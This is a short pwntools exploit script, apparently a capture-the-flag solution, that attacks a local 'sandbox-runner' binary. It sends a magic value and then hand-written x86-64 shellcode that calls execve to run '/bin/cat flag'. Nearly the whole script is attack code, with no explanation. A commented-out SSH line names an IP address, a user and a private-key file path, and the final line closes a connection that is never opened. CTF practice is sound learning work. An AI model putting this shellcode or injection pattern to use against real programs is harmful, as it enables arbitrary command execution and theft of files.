from pwn import *
solvestr = "\x90\x90\x90\x90\x90\x90\x90\x90\x90\x48\x31\xd2\xbe\x2f\x63\x61\x74\xbb\x2f\x62\x69\x6e\x48\xc1\xe6\x20\x48\x01\xde\xb8\x66\x6c\x61\x67\x52\x50\x48\x89\xe1\x52\x56\x48\x89\xe7\x52\x51\x57\x48\x89\xe6\xb8\x3b\x00\x00\x00\x0f\x05"
context.log_level='DEBUG'

#s1 = ssh(host='129.21.228.181', user='vagrant',keyfile='/home/stnevans/Desktop/ctf/ists/deployu.pem')
pe = gdb.debug("./sandbox-runner")
#pe = remote("localhost", 9001)
#pe = process("./sandbox-runner-2")
pe.readuntil("favorite")
pe.sendline("40691347219182962") #has run in the hex of it
pe.readuntil("instructions")
#gdb.attach(pe)
pe.sendline("input" + solvestr)

pe.interactive()
pe.close()
s1.close()
